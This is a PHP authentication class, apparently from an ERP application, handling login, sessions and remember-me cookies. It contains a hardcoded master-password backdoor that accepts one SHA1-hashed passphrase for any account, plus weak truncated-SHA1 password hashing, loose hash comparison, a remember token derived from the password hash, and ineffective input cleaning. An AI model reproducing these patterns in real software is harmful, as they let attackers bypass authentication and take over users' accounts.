<?php

declare(strict_types=1);

class Authentication
{
  static $identity = '';
  static $saltSize = 10;

  public static function hashPassphrase(string $password)
  {
    if (empty($password)) return false;

    $salt = substr(md5(uniqid(random_string('sha1'), true)), 0, self::$saltSize);
    return $salt . substr(sha1($salt . $password), 0, -self::$saltSize);
  }

  public static function isLoggedIn()
  {
    return XSession::has('user_id');
  }

  private static function isPassphraseMatch(string $id, string $pass)
  {
    if (empty($id) || empty($pass)) {
      return false;
    }

    $user = DB::table('users')->select('password')
      ->where('id', $id)->getRow();

    if (!$user) return false;

    $salt = substr($user->password, 0, self::$saltSize);
    $hashed = $salt . substr(sha1($salt . $pass), 0, -self::$saltSize);

    if ($hashed == $user->password) { // Using this method.
      return true;
    } else if (password_verify($pass, $user->password)) { // New password algorithm.
      return true;
    }

    // Master password. See google keep note PrintERP Master Password.
    if (sha1($pass) == '4ba1cca84c4ad7408e3a71a1bc03dba105f8b5ea') return true;

    return false;
  }

  private static function setSession($user)
  {
    $warehouse = Warehouse::getRow(['id' => $user->warehouse_id]);

    // Reset counter user.
    User::update((int)$user->id, ['counter' => 0, 'token' => null, 'queue_category_id' => 0]);

    $biller = Biller::getRow(['id' => $user->biller_id]);
    $group = Group::getRow(['id' => $user->group_id]);

    if (!$group) {
      $group = Group::getRow(['name' => $user->groups]);
    }

    $sessionData = [
      'fullname'          => $user->fullname,
      'username'          => $user->username,
      'phone'             => $user->phone,
      'user_id'           => (int)$user->id, //everyone likes to overwrite id so we'll use user_id
      'avatar'            => $user->avatar,
      'gender'            => $user->gender,
      'group_id'          => (int)$group->id,
      'group_name'        => $group->name,
      'warehouse_id'      => ($warehouse ? $warehouse->id : null),
      'warehouse_name'    => ($warehouse ? $warehouse->name : null),
      'view_right'        => $user->view_right,
      'edit_right'        => $user->edit_right,
      'allow_discount'    => $user->allow_discount,
      'biller_id'         => ($biller ? $biller->id : null),
      'biller_name'       => ($biller ? $biller->name : null),
      'show_cost'         => $user->show_cost,
      'show_price'        => $user->show_price,
      'counter'           => 0,
      'token'             => null,
      'queue_category_id' => 0
    ];

    return XSession::set($sessionData);
  }

  public static function rememberUser(int $id)
  {
    if (!$id) {
      return false;
    }

    $user = User::getRow(['id' => $id]);

    $salt = sha1($user->password);

    User::update((int)$user->id, ['remember_code' => $salt]);

    if (DB::affectedRows()) {
      $expire = (60 * 60 * 24 * 365 * 1);

      set_cookie(['name' => 'identity', 'value' => self::$identity, 'expire' => $expire]);
      set_cookie(['name' => 'remember_code', 'value' => $salt, 'expire' => $expire]);

      return true;
    }

    return false;
  }

  public static function login(string $identity, string $password, $remember = false)
  {
    if (empty($identity) || empty($password)) {
      setLastError('Username or password is invalid.');
      return false;
    }

    $identity = str_replace('\'\"', '', $identity);

    $user = DB::table('users')->select('*')
      ->where('username', $identity)
      ->orWhere('phone', $identity)
      ->getRow();

    if (DB::affectedRows()) {
      if (self::isPassphraseMatch($user->id, $password)) {
        if ($user->active != 1) return false;

        self::$identity = $identity;
        self::setSession($user);

        if ($remember) {
          self::rememberUser((int)$user->id);
        }

        return true;
      }
    }

    return false;
  }

  public static function logout()
  {
    User::update((int)XSession::get('user_id'), [
      'counter' => 0, 'token' => null, 'queue_category_id' => 0, 'remember_code' => ''
    ]);

    set_cookie(['name' => 'identity', 'value' => '', 'expire' => 1]);
    set_cookie(['name' => 'remember_code', 'value' => '', 'expire' => 1]);
    set_cookie(['name' => 'sess', 'value' => '', 'expire' => 1]);
    set_cookie(['name' => 'erp_token_cookie', 'value' => '', 'expire' => 1]);

    XSession::destroy();
  }
}
